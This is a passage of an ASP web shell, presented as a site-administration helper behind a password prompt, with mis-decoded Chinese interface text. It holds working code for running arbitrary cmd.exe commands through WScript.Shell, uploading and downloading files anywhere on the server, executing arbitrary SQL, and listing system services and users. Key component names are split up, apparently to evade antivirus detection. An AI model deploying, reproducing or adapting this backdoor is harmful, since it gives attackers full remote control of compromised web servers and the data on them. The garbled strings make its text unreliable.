URL             = Request.ServerVariables("URL")
ServerIP        = Request.ServerVariables("LOCAL_ADDR")
Action          = Request("Action")
RootPath        = Server.MapPath(".")
WWWRoot         = Server.MapPath("/")
FolderPath      = Request("FolderPath")
FName           = Request("FName")
BackUrl         = "<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"

If Session("webadmin")<>UserPass Then
  If Request.Form("Pass")<>"" Then
    If Request.Form("Pass")=UserPass Then
      Session("webadmin")=UserPass
      Response.Redirect URL
    Else
	 response.write"��֤ʧ�ܣ�"
    End If
  Else
    SI="<center style='font-size:12px'><br><br>��ӭʹ��ASPվ������<br><br>"
    SI=SI&"<form action='"&URL&"' method='post'>"
    SI=SI&"���룺<input name='Pass' type='password' size='15'>"
    SI=SI&"&nbsp;<input type='submit' value='��¼'></form></center>"
    Response.Write SI
  End If
  Response.End
End If

sub ShowErr()
  If Err Then
    Response.Write"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>"
    Err.Clear:Response.Flush
  End If		
end sub


Dim ObT(13,2)
ObT(0,0) = "Sc"&DEfd&"rip"&DEfd&"ting"&DEfd&".F"&DEfd&"ileS"&DEfd&"yste"&DEfd&"mObj"&DEfd&"ect"
  ObT(0,2) = "�ļ��������"
ObT(1,0) = "w"&DEfd&"sc"&DEfd&"ri"&DEfd&"pt.s"&DEfd&"he"&DEfd&"ll"
  ObT(1,2) = "������ִ�����"
ObT(2,0) = "ADOX.Catalog"
  ObT(2,2) = "ACCESS�������"
ObT(3,0) = "JRO.JetEngine"
  ObT(3,2) = "ACCESSѹ�����"
ObT(4,0) = "Scrip"&DEfd&"ting"&DEfd&".D"&DEfd&"icti"&DEfd&"onary" 
  ObT(4,2) = "�������ϴ��������"
ObT(5,0) = "Adodb.connection"
  ObT(5,2) = "���ݿ��������"
ObT(6,0) = "Ado"&DEfd&"d"&DEfd&"b"&DEfd&".S"&DEfd&"tre"&DEfd&"am"
  ObT(6,2) = "�������ϴ����"
ObT(7,0) = "SoftArtisans.FileUp"
  ObT(7,2) = "SA-FileUp �ļ��ϴ����"
ObT(8,0) = "LyfUpload.UploadFile"
  ObT(8,2) = "���Ʒ��ļ��ϴ����"
ObT(9,0) = "Persits.Upload.1"
  ObT(9,2) = "ASPUpload �ļ��ϴ����"
ObT(10,0) = "JMail.SmtpMail"
  ObT(10,2) = "JMail �ʼ��շ����"
ObT(11,0) = "CDONTS.NewMail"
  ObT(11,2) = "����SMTP�������"
ObT(12,0) = "SmtpMail.SmtpMail.1"
  ObT(12,2) = "SmtpMail�������"
ObT(13,0) = "Microsoft.XMLHTTP"
  ObT(13,2) = "���ݴ������"

For i=0 To 13
	Set T=Server.CreateObject(ObT(i,0))
	If -2147221005 <> Err Then
	  IsObj=True
	Else
	  IsObj=false
	  Err.Clear
	End If
	Set T=Nothing
	ObT(i,1)=IsObj
Next


Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function

Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function

If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If

If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if

Function MainForm()
  SI="<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
  SI=SI&"<input type=""hidden"" name=""Action"">"
  SI=SI&"<input type=""hidden"" name=""FName"">"
  SI=SI&"</form>"
  SI=SI&"<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>"
  SI=SI&"<tr><td height='30' colspan='2'>"
  SI=SI&"<table width='100%' height='25'  border='0' cellpadding='0' cellspacing='0'>"
  SI=SI&"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
  SI=SI&"<tr><td width='60' align='center'>��ַ����</td><td>"
  SI=SI&"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
  SI=SI&"</td><td width='60' align='center'><input name='Submit' type='submit' value='ת��'>" 
  SI=SI&"</td></tr></form></table></td></tr><tr><td width='160'>"
  SI=SI&"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='2' scrolling='yes'></iframe></td>"
  SI=SI&"<td>"
  SI=SI&"<iframe name='FileFrame' src='?Action=ShowFile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>"
  SI=SI&"</td></tr></table>"
  Response.Write SI
End Function


Function MainMenu()
  SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<tr><td height='5'></td></tr>"
  SI=SI&"<tr><td>&nbsp;"
  SI=SI&"FSO�ļ�����ģ��"
  SI=SI&"</td></tr>"
  If Not ObT(0,1) Then
    SI=SI&"<tr><td height='20'></td></tr>"
  Else
  Set ABC=New LBF:SI=SI&ABC.ShowDriver():Set ABC=Nothing
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:ShowFolder(""C:\\Progra~1"")'>C:\Progra~1</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:ShowFolder(""C:\\Docume~1"")'>C:\Docume~1</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>վ���Ŀ¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>������Ŀ¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>�½�Ŀ¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='?Action=EditFile' target='FileFrame'>�½��ı�</a>"
  SI=SI&"</td></tr>"
  End If
  Response.Write SI:SI=""
  
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='?Action=UpFile' target='FileFrame'>�ļ��ϴ�ģ��</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"���ݿ����ģ��"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>����MDB�ļ�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='?Action=DbManager' target='FileFrame'>���ݿ����</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>ѹ��MDB�ļ�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=CmdShell' target='FileFrame'>������ģ��</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=Course' target='FileFrame'>ϵͳ�����б�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=ServerInfo' target='FileFrame'>��������Ϣ</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=Logout' target='_top'>�˳���¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='http://www.gxgl.com' target='_blank'>�����ϱ�վ</a>"
  SI=SI&"</td></tr>"  
  SI=SI&"<tr><td height='20'>"
  SI=SI&"<br>&nbsp;վ������6 ��ǿ��<br>&nbsp;by lzhj QQ:56824448</a>"
  SI=SI&"</td></tr>"
  SI=SI&"</table>"
  Response.Write SI : SI=""
End Function

Function Course()
  SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>ϵͳ�û������</td></tr>"
  on error resume next
  for each obj in getObject("WinNT://.")
  err.clear
  if OBJ.StartType="" then
  SI=SI&"<tr>"
  SI=SI&"<td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"
  SI=SI&obj.Name
  SI=SI&"</td><td bgcolor=""#FFFFFF"">&nbsp;" 
  SI=SI&"ϵͳ�û�(��)"
  SI=SI&"</td></tr>"
  SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">&nbsp;</td></tr>" 
  end if
  if OBJ.StartType=2 then lx="�Զ�"
  if OBJ.StartType=3 then lx="�ֶ�"  
  if OBJ.StartType=4 then lx="����"
  if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
  SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#FF0000>&nbsp;"&obj.path&"</font></td></tr>"
  else
  SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#008000>&nbsp;"&obj.path&"</font></td></tr>"
  end if
  next
  Response.Write SI&SI0&SI1&SI2&"</table>"
End Function

Function ServerInfo()
  SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>�����������Ϣ</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>��������</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr>"
  SI=SI&"<form method=post action='http://www.ip138.com/index.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������IP</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"
  SI=SI&"<input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='��ѯ'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������ʱ��</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&now&"&nbsp;</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������CPU����</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>����������ϵͳ</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB�������汾</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
  For i=0 To 13
    SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,2)&"</td></tr>"
  Next
  Response.Write SI
End Function

Function DownFile(Path)
  Response.Clear
  Set OSM = CreateObject(ObT(6,0))
  OSM.Open
  OSM.Type = 1
  OSM.LoadFromFile Path
  sz=InstrRev(path,"\")+1
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
    Response.Charset = "UTF-8"
    Response.ContentType = "application/octet-stream"
    Response.BinaryWrite OSM.Read
    Response.Flush
  OSM.Close
  Set OSM = Nothing
End Function


Function HTMLEncode(S)
  if not isnull(S) then
    S = replace(S, ">", "&gt;")
    S = replace(S, "<", "&lt;")
    S = replace(S, CHR(39), "&#39;")
    S = replace(S, CHR(34), "&quot;")
    S = replace(S, CHR(20), "&nbsp;")
    HTMLEncode = S
  end if
End Function

Function UpFile()
  If Request("Action2")="Post" Then
    Set U=new UPC : Set F=U.UA("LocalFile")
	UName=U.form("ToPath")
    If UName="" Or F.FileSize=0 then
      SI="<br>�������ϴ�����ȫ·����ѡ��һ���ļ��ϴ�!"
    Else
        F.SaveAs UName
        If Err.number=0 Then
          SI="<center><br><br><br>�ļ�"&UName&"�ϴ��ɹ���</center>"
		End if
	End If
	Set F=nothing:Set U=nothing
	SI=SI&BackUrl
	Response.Write SI
	ShowErr()
	Response.End
  End If
    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    SI=SI&"<tr><td>"
    SI=SI&"�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\newup.asp")&"' size='40'>&nbsp;"
    SI=SI&"<input name='LocalFile' type='file'  size='25'>"
    SI=SI&"<input type='submit' name='Submit' value='�ϴ�'>"
    SI=SI&"</td></tr></form></table>"
  Response.Write SI
End Function

Function CmdShell()
  If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
  ShellPath=Session("ShellPath")
  if ShellPath="" Then ShellPath = "cmd.exe"
  if Request("wscript")="yes" then
  checked=" checked"
  else
  checked=""
  end if
  If Request("cmd")<>"" Then DefCmd = Request("cmd")
  SI="<form method='post'><input name='cmd' Style='width:92%' class='cmd' value='"&DefCmd&"'><input type='submit' value='ִ��'>"
  SI=SI&"<textarea Style='width:100%;height:500;' class='cmd'>"
  If Request.Form("cmd")<>"" Then
  if Request.Form("wscript")="yes" then
  Set CM=CreateObject(ObT(1,0))
  Set DD=CM.exec(ShellPath&" /c "&DefCmd)
  aaa=DD.stdout.readall
  SI=SI&aaa
  else%>
  <object runat=server id=ws scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
  <object runat=server id=ws scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
  <object runat=server id=fso scope=page classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
  <%szTempFile = server.mappath("cmd.txt")
  Call ws.Run (ShellPath&" /c " & DefCmd & " > " & szTempFile, 0, True)
  Set fs = CreateObject("Scripting.FileSystemObject")
  Set oFilelcx = fs.OpenTextFile (szTempFile, 1, False, 0)
  aaa=Server.HTMLEncode(oFilelcx.ReadAll)
  oFilelcx.Close
  Call fso.DeleteFile(szTempFile, True)
  SI=SI&aaa
  end if
  End If
  SI=SI&chr(13)&"</textarea>"
  SI=SI&"SHELL·����<input name='SP' value='"&ShellPath&"' Style='width:70%'>&nbsp;&nbsp;"
  SI=SI&"<input type='checkbox' name='wscript' value='yes'"&checked&">WScript.Shell</form>"
  Response.Write SI
End Function

Function CreateMdb(Path) 
   SI="<br><br>"
   Set C = CreateObject(ObT(2,0)) 
   C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
   Set C = Nothing
   If Err.number=0 Then
     SI = SI & Path & "�����ɹ�!"
   End If
   SI=SI&BackUrl 
   Response.Write SI
End function 

Function CompactMdb(Path)
If Not ObT(0,1) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
	Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
  If FSO.FileExists(Path) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
	Set C=Nothing
    FSO.DeleteFile Path
	FSO.MoveFile Path&"_bak",Path
  Else
    SI="<center><br><br><br>���ݿ�"&Path&"û�з��֣�</center>" 
	Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
    SI="<center><br><br><br>���ݿ�"&Path&"ѹ���ɹ���</center>"
  End If
  SI=SI&BackUrl
  Response.Write SI
End Function


Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")

  SI=SI&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<form name='DbForm' method='post' action=''>"
  SI=SI&"<tr><td width='100' height='27'> &nbsp;���ݿ����Ӵ�:</td>"
  SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
  SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>���Ӵ�ʾ��</option><option value=0>Access����</option>"
  SI=SI&"<option value=1>MsSql����</option><option value=2>MySql����</option><option value=3>DSN����</option>"
  SI=SI&"<option value=-1>--SQL�﷨--</option><option value=4>��ʾ����</option><option value=5>�������</option>"
  SI=SI&"<option value=6>ɾ������</option><option value=7>�޸�����</option><option value=8>�����ݱ�</option>"
  SI=SI&"<option value=9>ɾ���ݱ�</option><option value=10>����ֶ�</option><option value=11>ɾ���ֶ�</option>"
  SI=SI&"<option value=12>��ȫ��ʾ</option></select></td></tr>"
  SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  SI=SI&"<tr><td height='30'>&nbsp;SQL��������:</td>"
  SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
  SI=SI&"<td align='center'><input type='submit' name='Submit' value='ִ��' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  Response.Write SI:SI=""

  If Len(DbStr)>40 Then
  
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>��<br>��</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      SI=SI&"<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br>"
      SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  SI=SI&"</tr></table>"
  Response.Write SI:SI=""
	  
	  
	  
If Len(SqlStr)>10 Then

  If LCase(Left(SqlStr,6))="select" then
    SI=SI&"ִ����䣺"&SqlStr
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=20
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      SI=SI&"<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    SI=SI&"</tr>"

    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
	  SI=SI&"</tr>"
      Rs.MoveNext
    Loop
	
	Response.Write SI:SI=""
	
	SqlStr=HtmlEnCode(SqlStr)

    SI=SI&"<tr><td colspan="&FN+1&" align=center>��¼����"&RC&"&nbsp;ҳ�룺"&Page&"/"&PN
    If PN>1 Then
      SI=SI&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>��ҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>��һҳ</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        SI=SI&i&"&nbsp;"
        Else
        SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
        End If
      Next
	  SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>��һҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>βҳ</a>"
    End If
    SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	
	Response.Write SI:SI=""
  Else	   
    Conn.Execute(SqlStr)
    SI=SI&"SQL��䣺"&SqlStr
  End If

  Response.Write SI:SI=""
End If

  Conn.Close
  Set Conn=Nothing
  End If
End Function
%>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><%=ApplicationName&" - "&ServerIP%></title>
<style type="text/css">
<!--
  body,td {font-size: 12px;}
  input,select{font-size: 12px;background-color:#FFFFFF;}
  .tr {background-color:#EFEFEF;}
  .cmd {background-color:#000000;color:#FFFFFF}
  body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;
    <%If Action="" then response.write "overflow-x:hidden;overflow-y:hidden;"%>}
  a {color: black;text-decoration: none;}
  .am {color: #003366;font-size: 11px;}
-->
</style>
<script language="javascript">
<!--
  function yesok(){
    if (confirm("ȷ��Ҫִ�д˲�����"))
		return true;
	else
		return false;
    }

  function ShowFolder(Folder){
    top.addrform.FolderPath.value = Folder;
    top.addrform.submit();
    }

  function FullForm(FName,FAction){
    top.hideform.FName.value = FName;
	if(FAction=="CopyFile"){
	    DName = prompt("�����븴�Ƶ�Ŀ���ļ�ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="MoveFile"){
	    DName = prompt("�������ƶ���Ŀ���ļ�ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="CopyFolder"){
	    DName = prompt("�������ƶ���Ŀ���ļ���ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="MoveFolder"){
	    DName = prompt("�������ƶ���Ŀ���ļ���ȫ����",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="NewFolder"){
	    DName = prompt("������Ҫ�½����ļ���ȫ����",FName);
	    top.hideform.FName.value = DName;
	}else if(FAction=="CreateMdb"){
	    DName = prompt("������Ҫ�½���Mdb�ļ�ȫ����,ע�ⲻ��ͬ����",FName);
        top.hideform.FName.value = DName;
	}else if(FAction=="CompactMdb"){
	    DName = prompt("������Ҫѹ����Mdb�ļ�ȫ����,ע���ļ��Ƿ���ڣ�",FName);
        top.hideform.FName.value = DName;
	}else{
	    DName = "Other"; 
	}
	
	if(DName!=null){
      top.hideform.Action.value = FAction;
      top.hideform.submit();
	}else{
      top.hideform.FName.value = "";
	}
  }
  
  function DbCheck(){
    if(DbForm.DbStr.value == ""){
	  alert("�����������ݿ�");
	  FullDbStr(0);
	  return false;
	}
	return true;
  }
  
  function FullDbStr(i){
   if(i<0){
     return false;
   }
    Str = new Array(12);  
	Str[0] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=<%=RePath(Session("FolderPath"))%>\\db.mdb;Jet OLEDB:Database Password=***";
	Str[1] = "Driver={Sql Server};Server=<%=ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[2] = "Driver={MySql};Server=<%=ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[3] = "Dsn=DsnName";
	Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')";
	Str[6] = "DELETE FROM [TableName] WHERE ID=100";
	Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";
	Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[9] = "DROP TABLE [TableName]";
	Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
	Str[12]= "��ֻ��ʾһ������ʱ������ʾ�ֶε�ȫ���ֽڣ������������Ʋ�ѯʵ��.\n����һ������ֻ��ʾ�ֶε�ǰ��ʮ���ֽڡ�";
	if(i<=3){
	  DbForm.DbStr.value = Str[i];
	  DbForm.SqlStr.value = "";
	  abc.innerHTML="<center>��ȷ�ϼ��������ݿ�������SQL����������䡣</center>";
	}else if(i==12){
	  alert(Str[i]);
	}else{
	  DbForm.SqlStr.value = Str[i];
	}
	return true;
  } 
  
  
  function FullSqlStr(str,pg){
    if(DbForm.DbStr.value.length<5){
	  alert("�������ݿ����Ӵ��Ƿ���ȷ!")
	  return false;
	}
    if(str.length<10){
	  alert("����SQL����Ƿ���ȷ!")
	  return false;
	}
    DbForm.SqlStr.value = str ;
	DbForm.Page.value = pg;
	abc.innerHTML="";
	DbForm.submit();
    return true;
  }
-->
</script>
</head>
<%
Dim T1
Class UPC
  Dim D1,D2

  Public Function Form(F)
    F=lcase(F)
    If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function

  Public Function UA(F)
    F=lcase(F)
    If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function

  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
    set D1=CreateObject(ObT(4,0))
	if Request.TotalBytes<1 then Exit Sub
    set T1 = CreateObject(ObT(6,0))
	T1.Type = 1 : T1.Mode =3 : T1.Open
    T1.Write  Request.BinaryRead(Request.TotalBytes)
    T1.Position=0 : TDa =T1.Read : DStart = 1
    DEnd = LenB(TDa)
    set D2=CreateObject(ObT(4,0))
	vbCrlf = chrB(13) & chrB(10)
    set T2 = CreateObject(ObT(6,0))
    TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
    TLen = LenB (TSt)
    DStart=DStart+TLen+1
    while (DStart + 10) < DEnd
      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
      T2.Type = 1 : T2.Mode =3 : T2.Open
      T1.Position = DStart
      T1.CopyTo T2,DIEnd-DStart
      T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
      TIn = T2.ReadText : T2.Close
      DStart = InStrB(DIEnd,TDa,TSt)
      FStart = InStr(22,TIn,"name=""",1)+6
      FEnd = InStr(FStart,TIn,"""",1)
      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
      if InStr (45,TIn,"filename=""",1) > 0 then
        set TFL=new FIF
        FStart = InStr(FEnd,TIn,"filename=""",1)+10
        FEnd = InStr(FStart,TIn,"""",1)
        FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
        FEnd = InStr(FStart,TIn,vbCr)
        TFL.FileStart =DIEnd
        TFL.FileSize = DStart -DIEnd -3
        if not D2.Exists(UpName) then
          D2.add UpName,TFL
        end if
      else
        T2.Type =1 : T2.Mode =3 : T2.Open
        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
        T2.Position = 0 : T2.Type = 2
        T2.Charset ="gb2312"
        SFV = T2.ReadText
        T2.Close
        if D1.Exists(UpName) then
          D1(UpName)=D1(UpName)&", "&SFV
        else
          D1.Add UpName,SFV
        end if
      end if
      DStart=DStart+TLen+1
    wend
    TDa=""
    set T2 =nothing
  End Sub
  
  Private Sub Class_Terminate
    if Request.TotalBytes>0 then
      D1.RemoveAll:D2.RemoveAll
      set D1=nothing:set D2=nothing
      T1.Close:set T1 =nothing
    end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
     T3.Mode=3 : T3.Type=1 : T3.Open
     T1.position=FileStart
     T1.copyto T3,FileSize
     T3.SaveToFile F,2
     T3.Close
     set T3=nothing
     SaveAs=false
   end function
End Class


Class LBF
  Dim CF
  Private Sub Class_Initialize
    SET CF=CreateObject(ObT(0,0))
  End Sub

  Private Sub Class_Terminate
    Set CF=Nothing
  End Sub

  Function ShowDriver()
    For Each D in CF.Drives
      SI=SI&"<tr><td height='20'>&nbsp;&nbsp;"
      SI=SI&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>���ش��� ("&D.DriveLetter&":)</a>" 
      SI=SI&"</td></tr>"
    Next
	ShowDriver=SI
  End Function

  Function ShowFile(Path)
